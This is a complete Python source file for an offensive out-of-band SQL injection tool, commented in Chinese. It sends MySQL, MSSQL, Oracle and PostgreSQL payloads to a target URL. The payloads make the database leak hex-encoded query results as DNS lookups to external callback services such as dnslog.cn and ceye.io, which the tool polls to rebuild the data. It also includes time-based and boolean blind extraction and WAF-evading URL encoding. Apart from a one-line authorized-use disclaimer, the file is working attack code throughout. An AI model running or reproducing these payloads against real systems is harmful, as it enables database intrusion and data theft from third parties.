#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DnslogSqlinj 3 - 现代 DNS 带外 SQL 注入工具（Python3 / 单文件 / 零依赖）

    DnslogSqlinj(2019, py2 + ceye.io 硬编码) 的第三代重写。

对照原版 ADOOO/DnslogSqlinj(py2 + ceye.io 硬编码 + 按字符二分):
  1. py3, 无第三方依赖
  2. 内置 --check 体检(含 fake-ip 识别与 DoH 兜底), 不用再去平台页面手点
  3. 数据按 HEX 整块外带: 一次 DNS 解析搬 30 字节, 请求数降一个数量级
  4. Provider 可插拔: dnslog.cn / DNSLog-GO / ceye.io / 自定义 shell 命令
  5. 四种原语: MySQL / MSSQL / Oracle / PostgreSQL
  6. --blind 布尔通道兜底(只有 0/1 回显、无 hex 函数时用)
  7. --self-test 离线自检, 不联网

示例:
  dnslogsqlinj3 --provider dnslog.cn --dbms mysql \
    --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" \
    --expr "select group_concat(schema_name) from information_schema.schemata"

  dnslogsqlinj3 --provider dnsloggo --base http://DNSLOG_HOST:8000 \
    --token TOKEN --dbms mssql --url "http://TARGET/api?id=1%PAYLOAD%" \
    --expr "select db_name()"

  # 先体检再注入(推荐): 领域名 + 探针解析 + 平台确认
  dnslogsqlinj3 --provider ceye --token TOKEN --ident IDENT --check

  # ceye.io (原版同款): --token 与 --ident 在 ceye 个人设置页
  dnslogsqlinj3 --provider ceye --token TOKEN --ident IDENT --dbms mysql \
    --url "http://TARGET/Less-9/?id=1'%PAYLOAD%--+-" --expr "select version()"

  # 自定义平台(Burp Collaborator / interactsh / 自研)
  dnslogsqlinj3 --provider cmd \
    --domain-cmd  'curl -s http://PLATFORM/new' \
    --records-cmd 'curl -s "http://PLATFORM/poll?d=%DOMAIN%"' \
    --dbms mysql --url "..." --expr "select version()"

仅限授权测试环境。
"""
__version__ = "3.0.0"
__all__ = ["main", "DnsExfil", "DBMS_MAP", "encode_payload", "build_provider"]
import argparse
import binascii
import http.cookiejar
import json
import os
import random
import re
import socket
import string
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


# --------------------------------------------------------------------------- #
# Provider: 领一个域名 + 轮询解析记录
# --------------------------------------------------------------------------- #
class Provider:
    def get_domain(self):
        raise NotImplementedError

    def get_records(self):
        """返回 list[str] 完整记录名(可带基域)。"""
        raise NotImplementedError


class DnslogCN(Provider):
    """dnslog.cn: 免费、靠 cookie 绑会话、有限流。"""

    BASE = "http://www.dnslog.cn"

    def __init__(self):
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def _get(self, path):
        req = urllib.request.Request(self.BASE + path, headers={"User-Agent": UA})
        with self.op.open(req, timeout=15) as r:
            return r.read().decode("utf-8", "replace").strip()

    def get_domain(self):
        d = self._get("/getdomain.php")
        if not d:
            raise RuntimeError("dnslog.cn 未返回域名(限流/被墙)")
        return d

    def get_records(self):
        raw = self._get("/getrecords.php")
        try:
            data = json.loads(raw) or []
        except json.JSONDecodeError:
            return []
        out = []
        for x in data:
            # dnslog.cn 现在返回 [[name, ip, time], ...]
            if isinstance(x, (list, tuple)) and x:
                out.append(str(x[0]))
            elif isinstance(x, dict):
                out.append(str(x.get("name") or x.get("record") or ""))
            else:
                out.append(str(x))
        return out


class DnslogGO(Provider):
    """lanyi1998/DNSlog-GO 自建版, 兼容常见字段差异。"""

    def __init__(self, base, token):
        self.base = base.rstrip("/")
        self.token = token
        self.domain = None

    def _api(self, path):
        sep = "&" if "?" in path else "?"
        url = "%s%s%stoken=%s" % (self.base, path, sep, urllib.parse.quote(self.token))
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode("utf-8", "replace"))

    def get_domain(self):
        j = self._api("/api/get_domain")
        d = j
        if isinstance(j, dict):
            if isinstance(j.get("data"), dict):
                d = j["data"].get("domain")
            elif isinstance(j.get("data"), str):
                d = j["data"]
            else:
                d = j.get("domain")
        if not isinstance(d, str) or not d:
            raise RuntimeError("DNSLog-GO 未返回 domain, 原始响应: %s" % j)
        self.domain = d
        return d

    def get_records(self):
        j = self._api("/api/query?domain=" + urllib.parse.quote(self.domain or ""))
        data = j
        if isinstance(j, dict):
            if isinstance(j.get("data"), list):
                data = j["data"]
            elif isinstance(j.get("records"), list):
                data = j["records"]
            elif isinstance(j.get("data"), dict) and isinstance(j["data"].get("records"), list):
                data = j["data"]["records"]
        if not isinstance(data, list):
            return []
        out = []
        for x in data:
            if isinstance(x, str):
                out.append(x)
            elif isinstance(x, dict):
                out.append(str(x.get("name") or x.get("record") or x.get("domain") or ""))
        return out


class Ceye(Provider):
    """
    ceye.io —— 原版用的平台, 直接在 https://ceye.io 注册拿 token/identifier。
      端点是 /v1/records?token=..&type=dns(可加 filter 按子串过滤)
      记录长这样: <nonce>.h000000.<hex>.<identifier>.ceye.io
    """

    BASE = "http://api.ceye.io/v1"

    def __init__(self, token, ident=None, base=None, filter_=None):
        self.token = token
        self.ident = ident or token[:20]
        self.base = (base or self.BASE).rstrip("/")
        self.filter = filter_

    def get_domain(self):
        return "%s.ceye.io" % self.ident

    def get_records(self):
        q = {"token": self.token, "type": "dns"}
        if self.filter:
            q["filter"] = self.filter
        url = "%s/records?%s" % (self.base, urllib.parse.urlencode(q))
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                raw = r.read()
        except urllib.error.HTTPError as e:
            raw = e.read()          # ceye 用 404 返回错误, body 里仍是 JSON
        except (urllib.error.URLError, OSError) as e:
            raise RuntimeError("连不上 ceye API(%s): %s —— 检查网络/代理, 或 --base"
                               % (self.base, e))
        j = json.loads(raw.decode("utf-8", "replace"))
        meta = j.get("meta") or {}
        code = meta.get("code")
        if code not in (200, None):
            hint = {
                21: "token 无效 (--token 填个人设置页的 API Token)",
                88: "参数不合法, 检查 token 长度/--filter",
                404: "接口路径不对, --base 应形如 http://api.ceye.io/v1",
            }.get(code, "检查 --token / --ident / --base")
            raise RuntimeError("ceye 拒绝请求: code=%s %s —— %s"
                               % (code, meta.get("message"), hint))
        return [str(x.get("name", "")) for x in (j.get("data") or []) if isinstance(x, dict)]


class CmdProvider(Provider):
    """把取域名/取记录交给用户命令; 输出支持 JSON 数组或逐行文本。"""

    def __init__(self, domain_cmd, records_cmd):
        self.domain_cmd = domain_cmd
        self.records_cmd = records_cmd
        self.domain = None

    @staticmethod
    def _run(cmd):
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return (p.stdout or "").strip()

    def get_domain(self):
        out = self._run(self.domain_cmd)
        # 允许 JSON 或纯文本
        try:
            j = json.loads(out)
            if isinstance(j, dict):
                out = str(j.get("domain") or (j.get("data") or {}).get("domain") or out)
        except (json.JSONDecodeError, AttributeError):
            pass
        self.domain = out.splitlines()[0].strip() if out else ""
        if not self.domain:
            raise RuntimeError("--domain-cmd 没有输出域名")
        return self.domain

    def get_records(self):
        out = self._run(self.records_cmd.replace("%DOMAIN%", self.domain or ""))
        try:
            j = json.loads(out)
        except json.JSONDecodeError:
            return [ln.strip() for ln in out.splitlines() if ln.strip()]
        if isinstance(j, list):
            return [x if isinstance(x, str) else str(x.get("name", "")) for x in j]
        for k in ("data", "records", "result", "results"):
            v = j.get(k) if isinstance(j, dict) else None
            if isinstance(v, list):
                return [x if isinstance(x, str) else str(x.get("name", "")) for x in v]
        return []


# --------------------------------------------------------------------------- #
# DBMS 原语: 把 <marker>.<sql 算出的 hex>.<domain> 拼进注入语句
#   hex_sql(label, expr, off, ln)  -> 让 DNS 记录名成为  label + "." + HEX(数据) + "." + DOMAIN
#   blind_sql(label, cond)         -> 条件为真才触发解析
# --------------------------------------------------------------------------- #
class DBMS:
    name = "?"
    notes = ""
    # 时间盲注: {cond} 为真时挂 {delay} 秒
    time_tpl = None

    def __init__(self):
        self.domain = ""

    def _fill(self, tpl, **kw):
        s = tpl.format(**kw)
        return s.replace("%DOMAIN%", self.domain)

    def hex_sql(self, label, expr, off, ln):
        raise NotImplementedError

    def blind_sql(self, label, cond):
        raise NotImplementedError


class MySQL(DBMS):
    name = "mysql"
    notes = "MySQL: LOAD_FILE 走 UNC, 需 Windows 目标 + FILE 权限 + secure_file_priv 放行; Linux 不触发解析"
    # 注意: 必须用正斜杠 //host/share。实测 Windows+MySQL 用 \\host\share 时不会发起解析
    # (LOAD_FILE 直接返回 NULL), 而 //host/share 才会走 DNS。
    HEX = ("(SELECT LOAD_FILE(CONCAT('//','{label}.',"
           "HEX(SUBSTR(({expr}),{off},{ln})),'.','%DOMAIN%','/a.txt')))")
    BLIND = ("(SELECT IF(({cond}),LOAD_FILE(CONCAT('//','{label}.%DOMAIN%','/a.txt')),0))")

    def hex_sql(self, label, expr, off, ln):
        # off 传 0-based, MySQL SUBSTR 1-based
        return self._fill(self.HEX, label=label, expr=expr, off=off + 1, ln=ln)

    def blind_sql(self, label, cond):
        return self._fill(self.BLIND, label=label, cond=cond)

    time_tpl = "IF(({cond}),SLEEP({delay}),0)"


class MSSQL(DBMS):
    name = "mssql"
    notes = "MSSQL: xp_dirtree 走 UNC; 需 sysadmin / xp 可用; 出网看 445/53 策略"
    HEX = ("DECLARE @p varchar(1024);"
           "SET @p='\\\\{label}.'+CONVERT(varchar(max),"
           "CAST(SUBSTRING(CAST(({expr}) AS varbinary(max)),{off},{ln}) AS varbinary(max)),2)"
           "+'.%DOMAIN%\\a';EXEC master..xp_dirtree @p;")
    BLIND = "IF({cond}) EXEC master..xp_dirtree '\\\\{label}.%DOMAIN%\\a'"

    def hex_sql(self, label, expr, off, ln):
        return self._fill(self.HEX, label=label, expr=expr, off=off + 1, ln=ln)

    def blind_sql(self, label, cond):
        return self._fill(self.BLIND, label=label, cond=cond)

    time_tpl = "IF ({cond}) WAITFOR DELAY '0:0:{delay}'"


class Oracle(DBMS):
    name = "oracle"
    notes = "Oracle: UTL_INADDR 触发解析; 需该包执行权限, 11g+ 默认可能被回收"
    HEX = ("(SELECT UTL_INADDR.GET_HOST_ADDRESS('{label}.'||"
           "RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({expr}),{off},{ln})))||'.%DOMAIN%') FROM dual)")
    BLIND = ("(SELECT CASE WHEN ({cond}) THEN "
             "UTL_INADDR.GET_HOST_ADDRESS('{label}.%DOMAIN%') ELSE NULL END FROM dual)")

    def hex_sql(self, label, expr, off, ln):
        return self._fill(self.HEX, label=label, expr=expr, off=off + 1, ln=ln)

    def blind_sql(self, label, cond):
        return self._fill(self.BLIND, label=label, cond=cond)

    time_tpl = "(SELECT CASE WHEN ({cond}) THEN dbms_lock.sleep({delay}) END FROM dual)"


class Postgres(DBMS):
    name = "postgres"
    notes = "PostgreSQL: 依赖 dblink 扩展(create extension dblink); 无 dblink 时只有 superuser 的 COPY..TO PROGRAM 可用"
    HEX = ("(SELECT dblink_connect('host={label}.'||"
           "encode(convert_to(substr(({expr}),{off},{ln}),'utf8'),'hex')||'.%DOMAIN% "
           "port=53 dbname=x'))")
    BLIND = ("(SELECT CASE WHEN ({cond}) THEN "
             "dblink_connect('host={label}.%DOMAIN% port=53 dbname=x') ELSE NULL END)")

    def hex_sql(self, label, expr, off, ln):
        return self._fill(self.HEX, label=label, expr=expr, off=off + 1, ln=ln)

    def blind_sql(self, label, cond):
        return self._fill(self.BLIND, label=label, cond=cond)

    time_tpl = "CASE WHEN ({cond}) THEN pg_sleep({delay}) END"


DBMS_MAP = {"mysql": MySQL, "mssql": MSSQL, "oracle": Oracle, "postgres": Postgres}


# --------------------------------------------------------------------------- #
# 核心引擎
# --------------------------------------------------------------------------- #
# WAF 友好编码: 只编码真正会破坏 URL 的字符。
# 实测发现: %22(双引号) %2F(斜杠) %28/29(括号) 会被 phpstudy 的防护模块直接断连,
# 而把这些字符原样发出则正常执行。
_WAF_SAFE = "/:;'\"(),.*!@$_-~"


def encode_payload(s, mode="auto"):
    if mode == "strict":
        return urllib.parse.quote(s, safe="")
    return urllib.parse.quote(s, safe=_WAF_SAFE)


class DnsExfil:
    def __init__(self, provider, dbms, url_tpl, method="GET", data_tpl=None, headers=None,
                 nonce=None, poll=2.0, timeout=90.0, verbose=False,
                 encode_mode="auto", http_timeout=30.0, prefix="AND ", suffix="",
                 sleep_delay=1.0, samples=2):
        self.p = provider
        self.db = dbms
        self.url_tpl = url_tpl
        self.method = method.upper()
        self.data_tpl = data_tpl
        self.headers = headers or {}
        self.nonce = nonce or "".join(random.choice(string.ascii_lowercase) for _ in range(5))
        self.poll = poll
        self.timeout = timeout
        self.verbose = verbose
        self.encode_mode = encode_mode
        self.http_timeout = http_timeout
        self.prefix = prefix
        self.suffix = suffix
        self.sleep_delay = sleep_delay
        self.samples = samples
        self.domain = ""

    # ---- 投递 ----
    def fire(self, sql, label):
        frag = self.prefix + sql + self.suffix
        url = (self.url_tpl.replace("%PAYLOAD%", encode_payload(frag, self.encode_mode))
               .replace("%SQL%", sql))
        if self.verbose:
            print("[>] %s %s" % (self.method, url[:240]), file=sys.stderr)
            print("[>] sql: %s" % sql, file=sys.stderr)
        body = None
        if self.method == "POST" and self.data_tpl:
            body = self.data_tpl.replace("%PAYLOAD%", encode_payload(sql, self.encode_mode)) \
                                 .replace("%SQL%", sql).encode()
        t0 = time.time()
        try:
            req = urllib.request.Request(url, data=body,
                                         headers={"User-Agent": UA, **self.headers})
            with urllib.request.urlopen(req, timeout=self.http_timeout) as r:
                r.read(2048)
        except Exception as e:      # 目标 500/超时都不影响 DNS 是否已经出去
            if self.verbose:
                print("[!] http: %s" % e, file=sys.stderr)
        return time.time() - t0

    # ---- 记录读取 ----
    def _names(self):
        out = []
        for rec in self.p.get_records():
            n = str(rec).strip().rstrip(".").lower()
            if n:
                out.append(n)
        return out

    def wait_for(self, marker, deadline=None):
        """等一条以 marker 开头的记录，返回整条记录名。"""
        deadline = deadline or (time.time() + self.timeout)
        while time.time() < deadline:
            try:
                names = self._names()
            except Exception as e:      # 平台偶发 5xx/超时不该打断整轮 dump
                if self.verbose:
                    print("[!] 拉记录失败, 重试: %s" % e, file=sys.stderr)
                names = []
            for n in names:
                if n.startswith(marker):
                    return n
            time.sleep(self.poll)
        return None

    # ---- hex 整块外带 ----
    def hex_chunk(self, expr, off, ln):
        marker = "%s.h%06d" % (self.nonce, off)
        self.fire(self.db.hex_sql(marker, expr, off, ln), marker)
        rec = self.wait_for(marker)
        if rec is None:
            return None
        # marker.<hex>.<domain>  -> 取 marker 与 domain 之间那段
        mid = rec[len(marker):].strip(".")
        if self.domain and mid.endswith("." + self.domain):
            mid = mid[: -(len(self.domain) + 1)]
        hexpart = re.sub(r"[^0-9a-f]", "", mid.split(".")[0])
        if len(hexpart) % 2:
            hexpart = hexpart[:-1]
        return bytes.fromhex(hexpart) if hexpart else b""

    def dump(self, expr, chunk=30, max_bytes=8192):
        buf = b""
        off = 0
        misses = 0
        while off < max_bytes:
            piece = self.hex_chunk(expr, off, chunk)
            if not piece:
                misses += 1
                if misses >= 2:
                    break
            else:
                misses = 0
                buf += piece
                print("[*] +%-4d %r" % (len(buf), buf[-48:]), file=sys.stderr)
                if len(piece) < chunk:
                    break
            off += chunk
        return buf

    # ---- 布尔二分 ----
    def blind_char(self, expr, pos):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            marker = "%s.b%05d_%03d" % (self.nonce, pos, mid)
            cond = "ASCII(SUBSTR((%s),%d,1))>%d" % (expr, pos, mid)
            self.fire(self.db.blind_sql(marker, cond), marker)
            hit = self.wait_for(marker, deadline=time.time() + max(self.timeout / 4.0, 5.0))
            if hit:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def blind_dump(self, expr, max_len=512):
        out = b""
        for pos in range(1, max_len + 1):
            c = self.blind_char(expr, pos)
            if not c:
                break
            out += bytes([c])
            print("[*] blind +%-4d %r" % (len(out), out[-32:]), file=sys.stderr)
        return out


    # ---- 时间盲注(不需要任何带外通道) ----
    def time_cond(self, cond):
        tpl = self.db.time_tpl
        if not tpl:
            sys.exit("[x] %s 没有配置时间盲注模板" % self.db.name)
        return self.db._fill(tpl, cond=cond, delay=self.sleep_delay)

    def time_char(self, expr, pos):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            sql = self.time_cond("ASCII(SUBSTR((%s),%d,1))>%d" % (expr, pos, mid))
            got = [self.fire(sql, "t") for _ in range(max(self.samples, 1))]
            hit = min(got) > self.sleep_delay * 0.6     # 取最小值抗网络抖动
            if self.verbose:
                print("      pos%-3d >%-3d %s %s" % (pos, mid, ["%.2f" % g for g in got],
                                                    "T" if hit else "f"), file=sys.stderr)
            if hit:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def time_dump(self, expr, max_len=256):
        out = b""
        for pos in range(1, max_len + 1):
            c = self.time_char(expr, pos)
            if not c:
                break
            out += bytes([c])
            print("[*] +%-4d %r" % (len(out), out[-40:]), file=sys.stderr)
        return out


def build_provider(a):
    if a.provider == "dnslog.cn":
        return DnslogCN()
    if a.provider == "dnsloggo":
        return DnslogGO(a.base or "http://127.0.0.1:8000", a.token or "")
    if a.provider == "ceye":
        a.token = a.token or os.environ.get("CEYE_TOKEN")
        if not a.token:
            sys.exit("[x] ceye 需要 --token 或环境变量 CEYE_TOKEN (ceye.io 个人设置页)")
        if not (a.ident or os.environ.get("CEYE_IDENT")):
            sys.exit("[x] ceye 需要 --ident 或环境变量 CEYE_IDENT (个人设置页的 Identifier, 如 abc12def34)")
        return Ceye(a.token, a.ident or os.environ.get("CEYE_IDENT"),
                    base=a.base, filter_=a.filter)
    if a.provider == "cmd":
        if not (a.domain_cmd and a.records_cmd):
            sys.exit("[x] --provider cmd 需要 --domain-cmd 与 --records-cmd")
        return CmdProvider(a.domain_cmd, a.records_cmd)
    sys.exit("[x] 未知 provider: %s" % a.provider)


# 代理软件(Clash/sing-box)的 fake-ip 默认段与内网段: 命中即说明查询没真正出网
_FAKE_PREFIXES = ("198.18.", "198.19.", "127.", "0.0.0.0", "10.", "192.168.",
                  "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.30.", "172.31.",
                  "::1", "fe80:", "2001:2:", "fc", "fd")


def _looks_fake(ip):
    """Clash/sing-box 的 fake-ip 段(198.18.0.0/15)或内网地址 —— 说明查询没真正出网。"""
    return any(ip.startswith(p) for p in _FAKE_PREFIXES)


def _resolve_doh(fqdn, timeout=12):
    """本地 DNS 被代理劫持时, 用 DoH 让权威 NS 真正收到查询。"""
    for url, hdr in (
        ("https://cloudflare-dns.com/dns-query?type=A&name=", "application/dns-json"),
        ("https://dns.google/resolve?type=A&name=", "application/dns-json"),
    ):
        try:
            req = urllib.request.Request(url + urllib.parse.quote(fqdn),
                                         headers={"accept": hdr, "User-Agent": UA})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                j = json.loads(r.read().decode("utf-8", "replace"))
            ips = [a.get("data") for a in (j.get("Answer") or []) if a.get("type") == 1]
            if ips:
                return ips, url.split("/")[2]
        except Exception:
            continue
    return [], None


def _probe_resolve(fqdn, force_doh=False):
    """返回 (ips, 说明)。优先本地解析, 遇到 fake-ip 自动走 DoH。"""
    if not force_doh:
        try:
            infos = socket.getaddrinfo(fqdn, None)
            ips = sorted({i[4][0] for i in infos})
            if ips and not all(_looks_fake(ip) for ip in ips):
                return ips, "本地解析"
            if ips:
                print("[!] 本地解析返回 %s，命中 fake-ip/内网段，查询没真正到权威 NS"
                      % ", ".join(ips[:2]))
        except OSError as e:
            print("[!] 本地解析失败(%s)" % e)
    ips, via = _resolve_doh(fqdn)
    if ips:
        return ips, "DoH(%s)" % via
    return [], None


def do_check(prov, timeout=30.0, verbose=False, force_doh=False):
    """
    联通性自检: 领域名 -> 本地解析一条随机子域 -> 等平台记录。
    返回 0 通过 / 1 平台没收到 / 2 凭证或接口错误。
    """
    name = prov.__class__.__name__
    print("[*] provider: %s" % name)

    try:
        domain = prov.get_domain()
    except Exception as e:
        print("[x] 领域名失败: %s" % e)
        return 2
    print("[+] 回调域名: %s" % domain)

    label = "chk%s" % "".join(random.choice(string.ascii_lowercase + string.digits)
                             for _ in range(6))
    fqdn = "%s.%s" % (label, domain)

    # ceye 按 filter 拉记录, 这里只关心本次探针
    if isinstance(prov, Ceye) and not prov.filter:
        prov.filter = label

    print("[*] 探针域名: %s" % fqdn)
    ips, via = _probe_resolve(fqdn, force_doh=force_doh)
    if ips:
        print("[+] 解析成功(%s): %s" % (via, ", ".join(ips[:3])))
    else:
        print("[!] 本地与 DoH 都没解析出地址，仍继续等平台记录")

    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            names = prov.get_records()
        except Exception as e:
            print("[x] 拉记录失败: %s" % e)
            return 2
        for n in names:
            n = str(n).strip().rstrip(".").lower()
            if label in n:
                print("[+] 平台已收到记录: %s" % n)
                print("[+] 通路正常，可以开始注入: 加 --url/--expr 去掉 --check 再跑")
                return 0
        time.sleep(1.5)

    hint = {
        "DnslogCN": "公共平台偶发限流，重试一次；仍失败就换 --provider dnsloggo 自建",
        "DnslogGO": "确认 --base 指向服务端且 53 端口对公网开放、平台随机二级域已生成",
        "Ceye": "确认 --token/--ident 正确且额度未耗尽；ceye 只收录解析过的子域，检查本机 DNS 是否走了代理",
        "CmdProvider": "你的 --records-cmd 必须能返回包含探针子域的记录，检查 %DOMAIN% 替换与输出格式",
    }.get(name, "检查网络与平台配置")
    if not force_doh:
        print("[!] 未收到记录, 自动改用 DoH 重试一次(绕过本地 DNS 劫持)")
        return do_check(prov, timeout=timeout, verbose=verbose, force_doh=True)
    print("[x] 超时 %ds 未在平台看到探针记录 —— %s" % (int(timeout), hint))
    return 1


def self_test():
    print("[*] self-test 1/3: hex 分块重组")
    data = "mysql>5.7.44|db:information_schema,mysql,ctf".encode()
    rebuilt = b""
    for i in range(0, len(data), 30):
        hx = binascii.hexlify(data[i:i + 30]).decode()
        rec = "abcd.h%06d.%s.dnslog.cn" % (i, hx)
        marker = "abcd.h%06d" % i
        mid = rec[len(marker):].strip(".")
        mid = mid[: -len(".dnslog.cn")]
        rebuilt += bytes.fromhex(mid.split(".")[0])
    assert rebuilt == data, rebuilt
    print("    ok: %d chunk(s) -> %r" % ((len(data) + 29) // 30, rebuilt))

    print("[*] self-test 2/3: 四种原语渲染")
    for name, cls in DBMS_MAP.items():
        db = cls()
        db.domain = "x.dnslog.cn"
        sql = db.hex_sql("abcd.h000030", "(select version())", 30, 30)
        assert "abcd.h000030" in sql and "x.dnslog.cn" in sql and "%" not in sql, sql
        assert len(sql) < 2000
        print("    %-8s %s" % (name, sql.replace("\n", " ")[:120]))
        blind = db.blind_sql("abcd.b00001_033", "1=1")
        assert "abcd.b00001_033" in blind and "x.dnslog.cn" in blind, blind
        print("    %-8s blind -> %s" % (name, blind.replace("\n", " ")[:120]))

    print("[*] self-test 3/3: 布尔二分还原")
    secret = b"ctf{dns_0k}"

    class Fake(DnsExfil):
        def __init__(self):
            self.db = MySQL()
            self.db.domain = "x.dnslog.cn"
            self.domain = "x.dnslog.cn"
            self.nonce = "zz"
            self.timeout = 1
            self.sent = []

        def fire(self, sql, label):
            self.sent.append(sql)

        def wait_for(self, marker, deadline=None):
            pos = int(marker.split(".")[-1].split("_")[0][1:])
            mid = int(marker.split("_")[-1])
            return marker if secret[pos - 1] > mid else None

    f = Fake()
    out = b""
    for pos in range(1, len(secret) + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            m = "zz.b%05d_%03d" % (pos, mid)
            if f.wait_for(m):
                lo = mid + 1
            else:
                hi = mid
        out += bytes([lo])
    assert out == secret, out
    print("    ok: %r (%d 次判定)" % (out, len(secret) * 7))
    print("[+] 自检通过, 未联网")


def main():
    epilog = """典型用法:
  1) 先自检脚本:      dnslogsqlinj3 --self-test
  2) 再检查回调平台:  dnslogsqlinj3 --provider ceye --token T --ident I --check
  3) 探路一条常量:    ... --url "http://T/?id=1'%PAYLOAD%--+-" --expr "select 0x414243"
  4) 正式外带:        ... --expr "select group_concat(schema_name) from information_schema.schemata"

ceye 凭证走环境变量可避免留在 history:  export CEYE_TOKEN=.. CEYE_IDENT=.."""
    ap = argparse.ArgumentParser(description="dnslog_inj - DnslogSqlinj modern rewrite",
                                 epilog=epilog,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--version", action="version", version="DnslogSqlinj 3 v" + __version__)
    ap.add_argument("--self-test", action="store_true", help="离线自检, 不访问网络")
    ap.add_argument("--check", action="store_true",
                    help="联通性自检: 领域名 + 发一条探针解析 + 确认平台收到, 通过后再正式注入")
    ap.add_argument("--check-timeout", type=float, default=30.0)
    ap.add_argument("--check-doh", action="store_true",
                    help="探针解析强制走 DoH(本地 DNS 被代理 fake-ip 劫持时用)")
    ap.add_argument("--provider", default="dnslog.cn",
                    choices=["dnslog.cn", "dnsloggo", "ceye", "cmd"])
    ap.add_argument("--base", help="DNSLog-GO 地址, 如 http://HOST:8000")
    ap.add_argument("--token", help="DNSLog-GO / ceye token")
    ap.add_argument("--filter", help="ceye 记录过滤子串(默认自动用 nonce), 也可用来只看某个任务")
    ap.add_argument("--ident", help="ceye 子域标识, 默认 token 前 20 位")
    ap.add_argument("--domain-cmd", help="自定义取域名命令")
    ap.add_argument("--records-cmd", help="自定义取记录命令, 支持 %%DOMAIN%% 占位")

    ap.add_argument("--dbms", default="mysql", choices=list(DBMS_MAP))
    ap.add_argument("--url", help="注入点 URL, 含 %%PAYLOAD%%(URL 编码后) 或 %%SQL%%(原样)")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", help="POST body 模板, 含 %%PAYLOAD%% 或 %%SQL%%")
    ap.add_argument("--header", action="append", default=[], help="额外 header, 如 'Cookie: a=b'")
    ap.add_argument("--expr", help="外带的 SQL 表达式, 如 'select version()'")
    ap.add_argument("--blind", action="store_true", help="布尔通道(不回带 hex, 每字符约 7 次请求)")
    ap.add_argument("--chunk", type=int, default=30, help="每块字节数, hex 后 <=60 字符")
    ap.add_argument("--max-bytes", type=int, default=8192)
    ap.add_argument("--poll", type=float, default=2.0)
    ap.add_argument("--timeout", type=float, default=90.0)
    ap.add_argument("--nonce", help="固定标记, 便于过滤平台记录")
    ap.add_argument("--technique", default="dns", choices=["dns", "time"],
                    help="dns=Hex 带外(默认, 最快); time=SLEEP 时间盲注(无带外也能跑, 慢)")
    ap.add_argument("--sleep-delay", type=float, default=1.0, help="时间盲注每次判定挂几秒")
    ap.add_argument("--samples", type=int, default=2, help="时间盲注每判定取样次数, 取最小值抗抖动")
    ap.add_argument("--prefix", default="AND ", help="payload 前缀(默认 'AND ', MSSQL 堆叠语句可传 ';')")
    ap.add_argument("--suffix", default="", help="payload 后缀, 例如 '-- -'")
    ap.add_argument("--encode", default="auto", choices=["auto", "strict"],
                    help="payload URL 编码方式: auto=保留 ()/\"' 等字符(绕 WAF, 默认), strict=全量编码")
    ap.add_argument("--http-timeout", type=float, default=30.0,
                    help="单次 HTTP 请求超时; UNC 触发 SMB 时会挂住, 建议 >=25")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args()

    if a.self_test:
        self_test()
        return

    if a.check:
        sys.exit(do_check(build_provider(a), timeout=a.check_timeout,
                      verbose=a.verbose, force_doh=a.check_doh))

    if not a.url or not a.expr:
        ap.error("--url 与 --expr 必填 (或用 --check / --self-test)")

    headers = {}
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    prov = build_provider(a)
    dbms = DBMS_MAP[a.dbms]()
    ex = DnsExfil(prov, dbms, a.url, a.method, a.data, headers,
                  nonce=a.nonce, poll=a.poll, timeout=a.timeout, verbose=a.verbose,
                  encode_mode=a.encode, http_timeout=a.http_timeout,
                  prefix=a.prefix, suffix=a.suffix,
                  sleep_delay=a.sleep_delay, samples=a.samples)
    ex.domain = prov.get_domain()
    dbms.domain = ex.domain
    if isinstance(prov, Ceye) and not prov.filter:
        prov.filter = ex.nonce          # 只拉自己这次的记录, 免得分页把噪声全拉回来

    print("[*] provider=%s  dbms=%s" % (a.provider, a.dbms))
    print("[!] %s" % dbms.notes)
    print("[*] callback: %s  nonce=%s" % (ex.domain, ex.nonce))

    expr = "(%s)" % a.expr
    if a.technique == "time":
        if a.http_timeout <= a.sleep_delay:
            ex.http_timeout = a.sleep_delay + 5
        print("[*] 时间盲注: 每字符约 7 x %d 次请求 x %.1fs" % (a.samples, a.sleep_delay))
        data = ex.time_dump(expr, max_len=a.max_bytes)
    elif a.blind:
        data = ex.blind_dump(expr)
    else:
        data = ex.dump(expr, a.chunk, a.max_bytes)

    print("\n[+] bytes: %d" % len(data))
    print("[+] raw : %r" % data)
    print("[+] text: %s" % data.decode("utf-8", "replace"))


if __name__ == "__main__":  # pragma: no cover
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
